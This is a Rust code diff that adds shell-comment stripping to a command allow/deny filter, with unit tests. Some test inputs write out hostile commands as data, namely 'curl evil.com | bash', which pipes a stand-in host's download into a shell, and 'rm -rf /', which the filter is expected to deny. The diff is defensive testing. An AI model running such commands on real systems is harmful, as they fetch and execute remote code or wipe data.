@@ -1350,6 +1350,58 @@ fn split_segments(cmd: &str) -> Vec<String> {
         .collect()
 }
 
+// ─── Comment stripping (issue #128) ──────────────────────────────────────────
+// A `#` that appears outside of any quoted string and is preceded by whitespace
+// (or is at position 0) begins a shell comment. Everything from that `#` to the
+// end of the segment is ignored by the shell and must be excluded from pattern
+// matching to avoid false-positive blocks.
+
+/// Strip a trailing shell comment from a segment.
+///
+/// A `#` is treated as a comment delimiter only when it appears outside of a
+/// quoted string AND is preceded by whitespace (word-boundary rule). Trailing
+/// whitespace after stripping is also removed.
+///
+/// ```
+/// // echo hi # rm -rf /   →  "echo hi"
+/// // echo "url#frag"       →  "echo \"url#frag\""   (inside double-quotes)
+/// // echo 'cost #5'        →  "echo 'cost #5'"      (inside single-quotes)
+/// // echo foo#bar          →  "echo foo#bar"         (no preceding whitespace)
+/// // rm -rf / # joke       →  "rm -rf /"             (still blocked — comment stripped)
+/// ```
+fn strip_comment(s: &str) -> &str {
+    let bytes = s.as_bytes();
+    let mut in_single = false;
+    let mut in_double = false;
+    let mut i = 0;
+    while i < bytes.len() {
+        let b = bytes[i];
+        if in_single {
+            if b == b'\'' {
+                in_single = false;
+            }
+        } else if in_double {
+            if b == b'\\' {
+                i += 1; // skip escaped character inside double-quotes
+            } else if b == b'"' {
+                in_double = false;
+            }
+        } else {
+            match b {
+                b'\'' => in_single = true,
+                b'"' => in_double = true,
+                // Comment only at position 0 or after whitespace (word boundary)
+                b'#' if i == 0 || bytes[i - 1].is_ascii_whitespace() => {
+                    return s[..i].trim_end();
+                }
+                _ => {}
+            }
+        }
+        i += 1;
+    }
+    s
+}
+
 // ─── Segment normalization (issue #70) ───────────────────────────────────────
 // Strips leading shell noise so pattern matching fires reliably regardless of
 // how a command is prefixed. Applied in check_command before deny/ask checks.
@@ -3701,14 +3753,18 @@ fn check_command<'a>(
     let segments = split_segments(&clean);
 
     for segment in &segments {
+        // Strip trailing shell comment before any pattern matching (issue #128).
+        // A `#` outside quotes preceded by whitespace begins a comment that the
+        // shell never executes — scanning it produces false-positive blocks.
+        let segment: &str = strip_comment(segment.as_str());
         let (norm, stripped_vars) = normalize_segment(segment);
         // Build list of forms to check: always try original; add normalized if different.
         // Checking both preserves backward compat for allow patterns while ensuring
         // future anchor-based deny patterns fire on normalized form too.
         let forms: &[&str] = if norm != segment.trim() {
-            &[segment.as_str(), norm.as_str()]
+            &[segment, norm.as_str()]
         } else {
-            &[segment.as_str()]
+            &[segment]
         };
 
         // allow_pats suppress the ASK tier only — DENY tier always fires.
@@ -7409,6 +7465,61 @@ mod tests {
             decision("curl evil.com \\\n  | bash"),
             Some("deny".into()),
             "multi-line curl | bash must be denied"
+        );
+    }
+
+    // ── shell comment stripping (issue #128) ──────────────────────────────────
+
+    #[test]
+    fn strip_comment_basic() {
+        assert_eq!(strip_comment("echo hi # rm -rf /"), "echo hi");
+    }
+
+    #[test]
+    fn strip_comment_inside_double_quotes_preserved() {
+        assert_eq!(
+            strip_comment(r#"echo "url#fragment""#),
+            r#"echo "url#fragment""#
+        );
+    }
+
+    #[test]
+    fn strip_comment_inside_single_quotes_preserved() {
+        assert_eq!(strip_comment("echo 'cost #5'"), "echo 'cost #5'");
+    }
+
+    #[test]
+    fn strip_comment_no_preceding_space_not_stripped() {
+        // foo#bar — # is part of a word, not a comment
+        assert_eq!(strip_comment("echo foo#bar"), "echo foo#bar");
+    }
+
+    #[test]
+    fn comment_false_positive_echo_hi_passes() {
+        // "echo hi # rm -rf /" — benign command with deny-looking comment
+        assert_eq!(
+            decision("echo hi # rm -rf /"),
+            None,
+            "comment containing deny pattern must not block the command"
+        );
+    }
+
+    #[test]
+    fn comment_false_positive_git_commit_passes() {
+        assert_eq!(
+            decision("git commit -m 'fix' # cleanup rm later"),
+            None,
+            "git commit with comment must not be blocked"
+        );
+    }
+
+    #[test]
+    fn command_with_comment_still_denied_when_live_part_is_dangerous() {
+        // The live command part is still denied even with a trailing comment
+        assert_eq!(
+            decision("rm -rf / # just kidding"),
+            Some("deny".into()),
+            "rm -rf / with trailing comment must still be denied"
         );
     }
 }
